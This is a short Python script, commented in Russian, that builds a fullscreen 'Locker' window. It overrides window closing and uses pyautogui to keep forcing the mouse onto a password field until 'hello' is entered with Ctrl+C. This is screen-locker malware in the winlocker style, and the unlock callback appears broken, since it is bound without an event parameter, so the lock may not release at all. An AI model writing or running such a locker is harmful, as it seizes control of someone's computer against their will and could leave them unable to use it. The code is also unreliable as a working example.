from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback():
    global key, entry
    if entry.get() == "hello":
        key = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)


root = Tk()
root.title("Locker")
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)  # Поле ввода
entry.place(width=150, height=50, x=600, y=400)  # Координаты и размеры
label0 = Label(root, text="Locker", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Write the Password and Press Ctrl+C", font='Arial 20')
label1.place(x=470, y=300)
root.update()  # Обновление экрана
sleep(0.2)  # Обновление экрана
click(675, 420)  # Обновление экрана
key = False
while not key:
    on_closing()
